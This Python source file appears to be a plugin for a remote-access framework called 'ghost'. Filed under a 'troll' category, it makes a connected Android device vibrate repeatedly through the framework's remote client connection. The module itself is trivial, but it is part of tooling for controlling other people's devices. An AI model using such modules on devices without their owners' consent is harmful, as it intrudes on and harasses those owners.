# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
from ghost.ghostlib.GhostModule import config, GhostModule, GhostArgumentParser

__class_name__="AndroidVibrate"

@config(compat="android", cat="troll", tags=["vibrator"])
class AndroidVibrate(GhostModule):
    """ activate the phone/tablet vibrator :) """

    dependencies=['ghostdroid.vibrator']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = GhostArgumentParser(prog="vibrator", description=cls.__doc__)

    def run(self, args):
        #Each element then alternates between vibrate, sleep, vibrate, sleep...
        pattern=[1000,1000,1000,1000,1000,1000,1000,1000]

        self.client.conn.modules['ghostdroid.vibrator'].vibrate(pattern)
